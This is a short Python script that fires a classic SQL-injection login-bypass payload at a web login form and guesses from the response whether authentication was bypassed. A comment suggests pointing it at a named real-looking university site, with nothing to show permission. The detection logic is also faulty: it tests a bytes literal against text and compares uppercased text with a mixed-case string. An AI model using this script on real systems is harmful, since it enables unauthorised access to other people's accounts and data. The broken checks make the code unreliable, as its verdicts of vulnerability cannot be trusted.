import requests
from bs4 import BeautifulSoup # Optional if not used for scraping, but good practice
import time

TARGET_URL = "https://example.com/login" 
# Replace this URL later. For now, use 'http://127.0.0.1:5000/login' after you run the server script or test on your target like sims.rucu.ac.tz if found.

headers = {
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'
}

def check_vuln(user_pass):
    """Sends a POST request and checks response."""
    username, password = user_pass
    
    # This mimics the vulnerable query logic: SELECT * FROM users WHERE ...
    params = {
        "username": username, 
        "password": password + "'" # Adding quote to help injection syntax
    }

    try:
        resp = requests.post(TARGET_URL, data=params, headers=headers)
        return resp.text, resp.status_code
    except Exception as e:
        print(f"Network Error: {e}")
        return "", 0

def run_basic_scan():
    print("--- Phase 1: Testing Basic Vulnerability ---")
    
    # Test payload 1: Bypass Auth (Classic SQLi)
    p1_user = "' OR 'a'='a-- -"  
    p1_pass = "'" 
    
    text, status = check_vuln((p1_user, p1_pass))
    
    if b'Welcome!' in text or "Login Failed" not in text.upper() and len(text)>200: 
         # Simple heuristic to detect success vs failure based on previous examples
         print("✓ Status Code:", status)
         print("Response Content Snippet:", text[:50] + "...") 
         print("\nResult: The endpoint appears vulnerable to Union/Boolean SQLi.")

if __name__ == '__main__':
    run_basic_scan()
